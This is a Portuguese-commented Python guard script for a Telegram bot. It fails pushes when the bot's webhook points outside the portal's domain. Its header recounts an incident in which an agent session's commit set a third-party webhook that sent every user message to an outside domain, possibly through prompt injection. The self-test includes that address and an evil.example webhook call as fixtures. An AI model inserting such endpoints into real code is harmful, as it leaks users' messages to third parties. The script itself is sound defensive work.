#!/usr/bin/env python3
"""
Barra endereço de webhook do bot do Telegram que não seja o do portal.

═══ POR QUE ESTE ARQUIVO EXISTE ═══

Em 25/09/2026 entrou no repositório, num commit de sessão de agente
(`6d224a45`, trailer `Co-Authored-By: Antigravity`), a constante:

    const WEBHOOK_URL = "https://tele.goldenherd.com/tg/webhook/8679298724";

O `scripts/vigia-telegram-opencode.mts` a chamava de "webhook externo" e a
RESTAURAVA a cada ciclo. Efeito medido em 01/10/2026: o bot público do portal
entregava TODA mensagem de usuário a um domínio de terceiro, e o `/menu` do
portal não recebia nada. O dono nunca configurou aquele endereço — na
avaliação dele, foi injeção de prompt ou alucinação de agente.

A regra do dono, de 01/10/2026, é curta: **o webhook aponta para o site
oficial e mais nada**; o bot fala com o celular dele pela API do Telegram, não
por endereço de terceiro. Um agente que "melhora" o webhook para um relay
próprio quebra as duas coisas no mesmo movimento: tira a entrega do portal e
manda mensagem de cidadão para fora.

═══ O QUE ELE BARRA ═══

R1. Linha que mexe em webhook (`setWebhook`, `WEBHOOK_URL`, `URL_WEBHOOK`) com
    URL de host fora do domínio do portal. É a régua que pega a constante
    acima, na forma exata em que ela entrou.
R2. Qualquer URL com cara de destino de webhook do Telegram (caminho com
    `/tg/webhook/`) fora do domínio do portal.
R3. A palavra `goldenherd` fora dos arquivos que registram o incidente. Cobre
    o caso novo: outro relay, outro nome, num arquivo que ninguém pensou em
    abrir.
R5. Em arquivo que CHAMA `setWebhook`, toda URL precisa ser do domínio do
    portal ou de `api.telegram.org`. Fecha o caminho de quem escreve a URL
    numa constante e só usa a variável na chamada — o caso em que R1 não vê
    nada na linha do `setWebhook`.

`api.telegram.org` é a API do próprio Telegram, não um destino alternativo:
bloquear isso mataria o bot inteiro.

═══ ONDE RODA ═══

Mesma rede de segurança dos dois checadores de dado pessoal: entra no
pre-push (`/.githooks/pre-push`) e na action `dado-pessoal.yml`. Um guarda que
só existe em teste protege quem roda o teste; este roda sozinho.

Uso:
    python scripts/checar-webhook-telegram.py             # varre o rastreado
    python scripts/checar-webhook-telegram.py --staged     # varre só o index
    python scripts/checar-webhook-telegram.py --self-test  # prova que vê
"""

from __future__ import annotations

import argparse
import io
import re
import subprocess
import sys

# O domínio do portal, com e sem `www`. O apex não é "outro lugar": é o mesmo
# dono (o `www` é o que responde 200; o apex devolve 301, e é por isso que o
# webhook se registra no www — ver o cabeçalho de telegram-set-webhook.mts).
HOSTS_DO_PORTAL = ("controlepopular.com.br", "www.controlepopular.com.br")

# Host de API do Telegram: é o mensageiro, não o destino do webhook.
HOSTS_PERMITIDOS = HOSTS_DO_PORTAL + ("api.telegram.org",)

# Arquivos que REGISTRAM o incidente — mencionam o nome de propósito, para quem
# vier depois entender o que aconteceu. Nome novo fora desta lista reprova: é o
# caso do agente que inventa outro relay.
ARQUIVOS_DO_INCIDENTE = {
    "scripts/telegram-set-webhook.mts",
    "scripts/vigia-telegram-opencode.mts",
    "AGENTS.md",
}

# Arquivos que o varredor NÃO varre. É UM: ele mesmo.
#
# O `--self-test` precisa de endereços ruins como dado de prova — um caso que
# diz "isto reprova" tem de conter o endereço que reprova. Varrer o próprio
# arquivo de fixtures faria a régua reprovar a si mesma em todo push (medido:
# o pre-push barrou o commit que introduziu este arquivo). O risco de abrir uma
# exceção é o de sempre — endereço de verdade escondido aqui — e ele é pequeno
# pelo tamanho do arquivo e porque este arquivo é justamente o que se revisa
# quando a régua muda.
ARQUIVOS_IGNORADOS = {"scripts/checar-webhook-telegram.py"}

RE_URL = re.compile(r"https?://([^\s\"'`<>)\]}]+)")
RE_LINHA_DE_WEBHOOK = re.compile(r"setWebhook|WEBHOOK_URL|URL_WEBHOOK", re.I)
RE_NOME_ESTRANHO = re.compile(r"goldenherd", re.I)


def _eh_comentario(conteudo: str) -> bool:
    """
    Linha de comentário/documentação não registra webhook — só o descreve.

    Sem isto o próprio registro do incidente (o cabeçalho de
    `telegram-set-webhook.mts`, que cita o endereço externo para explicar por
    que ele foi removido) seria reprovado pela régua que ele documenta.
    """
    s = conteudo.lstrip()
    return s.startswith(("*", "//", "#", "<!--", "--", '"""', "/*"))


def _hosts_da_linha(conteudo: str) -> list[str]:
    """Hosts de todas as URLs da linha, em minúsculas, sem porta nem caminho."""
    hosts = []
    for m in RE_URL.finditer(conteudo):
        host = m.group(1).split("/")[0].split(":")[0].lower()
        # Template literal (`http://${ip}:3029/...`) não é host: é pedaço de
        # string montada em runtime. Não há domínio para julgar.
        if any(c in host for c in "${}<>"):
            continue
        hosts.append(host)
    return hosts


def _oficial(host: str) -> bool:
    return any(host == h or host.endswith("." + h) for h in HOSTS_PERMITIDOS)


def problemas_na_linha(caminho: str, conteudo: str) -> list[str]:
    """Achados de R1, R2 e R3 para UMA linha. Puro: o --self-test reusa."""
    if caminho in ARQUIVOS_IGNORADOS:
        return []

    achados = []

    if not _eh_comentario(conteudo):
        if RE_LINHA_DE_WEBHOOK.search(conteudo):
            for host in _hosts_da_linha(conteudo):
                if not _oficial(host):
                    achados.append(f"R1: endereço de webhook fora do portal ({host})")

        if "/tg/webhook/" in conteudo:
            for host in _hosts_da_linha(conteudo):
                if not _oficial(host):
                    achados.append(
                        f"R2: URL com forma de webhook do Telegram fora do portal ({host})"
                    )

    if RE_NOME_ESTRANHO.search(conteudo) and caminho not in ARQUIVOS_DO_INCIDENTE:
        achados.append("R3: 'goldenherd' em arquivo que não registra o incidente")

    return achados


def problemas_no_arquivo(caminho: str) -> list[str]:
    """R5: arquivo que chama `setWebhook` só pode citar URL do portal ou da API."""
    if caminho in ARQUIVOS_IGNORADOS:
        return []

    achados = []
    for linha in _git_grep(r"https?://", caminho=caminho):
        _, numero, conteudo = linha
        if _eh_comentario(conteudo):
            continue
        for host in _hosts_da_linha(conteudo):
            if not _oficial(host):
                achados.append(
                    f"R5: {caminho}:{numero}: URL de {host} em arquivo que registra webhook"
                )
    return achados


# `setWebhook` como CHAMADA, não como menção em comentário: as duas formas que
# o código usa são a string da API (`"setWebhook"`) e a chamada direta.
RE_CHAMA_WEBHOOK = re.compile(r"""["']setWebhook["']|setWebhook\s*\(""")


def _git_grep(padrao: str, staged: bool = False, caminho: str | None = None) -> list[tuple[str, str, str]]:
    """Linhas que casam o padrão, como (arquivo, numero, conteudo)."""
    escopo = ["--cached"] if staged else []
    alvo = ["--", caminho] if caminho else []
    cmd = ["git", "grep", "-nIE", *escopo, "-e", padrao, *alvo]
    r = subprocess.run(cmd, capture_output=True, text=True, encoding="utf-8",
                       errors="replace")
    # `git grep` sai 1 quando não casa nada — é o caso bom.
    if r.returncode not in (0, 1):
        print(f"⚠️  git grep falhou ({r.returncode}): {r.stderr.strip()[:200]}",
              file=sys.stderr)
        return []
    saida = []
    for linha in r.stdout.splitlines():
        if not linha.strip():
            continue
        partes = linha.split(":", 2)
        if len(partes) < 3:
            continue
        saida.append((partes[0], partes[1], partes[2]))
    return saida


def achar(staged: bool) -> list[str]:
    achados: dict[str, None] = {}

    padroes = ["setWebhook|WEBHOOK_URL|URL_WEBHOOK", "tg/webhook", "goldenherd"]
    for padrao in padroes:
        for caminho, numero, conteudo in _git_grep(padrao, staged=staged):
            for problema in problemas_na_linha(caminho, conteudo):
                achados[f"{caminho}:{numero}: {problema} | {conteudo.strip()[:120]}"] = None

    # R5 só faz sentido nos arquivos que de fato CHAMAM setWebhook.
    arquivos = {
        caminho
        for caminho, _, conteudo in _git_grep(r"setWebhook", staged=staged)
        if RE_CHAMA_WEBHOOK.search(conteudo) and not _eh_comentario(conteudo)
    }
    for caminho in sorted(arquivos):
        for problema in problemas_no_arquivo(caminho):
            achados[problema] = None

    return list(achados)


def self_test() -> int:
    """Prova que a régua VÊ (e não é cega), e que não reprova o que é certo."""
    casos = [
        ('scripts/x.mts', 'const WEBHOOK_URL = "https://tele.goldenherd.com/tg/webhook/8679298724";', True),
        ('scripts/x.mts', 'const URL_WEBHOOK = "https://www.controlepopular.com.br/api/telegram";', False),
        ('scripts/x.mts', 'await telegramApi("setWebhook", { url: "https://evil.example/hook" });', True),
        ('scripts/x.mts', 'fetch(`https://api.telegram.org/bot${t}/setWebhook`);', False),
        # Comentário documenta, não registra: o registro do incidente cita o
        # endereço externo de propósito e não pode reprovar a si mesmo.
        ('scripts/telegram-set-webhook.mts', ' * `https://tele.goldenherd.com/tg/webhook/8679298724` — o endereço externo', False),
        # O nome só é tolerado nos arquivos que registram o incidente: num
        # arquivo qualquer, comentário ou código, reprova.
        ('scripts/x.mts', ' * `https://tele.goldenherd.com/tg/webhook/8679298724` — histórico', True),
        # URL montada em runtime não é host para julgar.
        ('scripts/x.mts', 'log(`HTTP escutando em http://${ip}:${PORTA}/sincronizar`);', False),
        # Apex é o mesmo dono (301 para o www), não é terceiro.
        ('scripts/x.mts', 'const url = "https://controlepopular.com.br/api/telegram";', False),
        ('docs/nota.md', 'o relay goldenherd foi removido', True),
        ('AGENTS.md', 'o endereço goldenherd foi enviado a terceiro', False),
    ]
    falhou = 0
    for caminho, linha, deve_reprovar in casos:
        achou = bool(problemas_na_linha(caminho, linha))
        if achou != deve_reprovar:
            falhou += 1
            print(f"✖ self-test: {caminho} | esperado {'reprovar' if deve_reprovar else 'passar'} | {linha}")
    if falhou:
        print(f"✖ self-test falhou em {falhou} caso(s).")
        return 1
    print("✓ self-test: a régua vê o endereço de fora e não reprova o oficial.")
    return 0


def main() -> int:
    # O console do Windows abre em cp1252 e estoura em caractere fora dele. Um
    # guarda que quebra ao RELATAR o achado não protege nada.
    try:
        sys.stdout.reconfigure(encoding="utf-8", errors="replace")
    except (AttributeError, io.UnsupportedOperation):
        pass

    p = argparse.ArgumentParser(description=__doc__)
    p.add_argument("--staged", action="store_true",
                   help="varrer só o index, em vez de tudo que é rastreado")
    p.add_argument("--self-test", action="store_true",
                   help="provar que a régua vê (não é cega)")
    args = p.parse_args()

    if args.self_test:
        return self_test()

    achados = achar(args.staged)
    if achados:
        print("⛔ O webhook do bot só pode apontar para o portal "
              f"({' ou '.join(HOSTS_DO_PORTAL)}).")
        print("   Mensagem de cidadão não vai para domínio de terceiro; e o "
              "long-poll do bot de trabalho depende disso.")
        for a in achados:
            print(f"   {a}")
        return 1

    print("✓ nenhum webhook apontando fora do portal")
    return 0


if __name__ == "__main__":
    sys.exit(main())
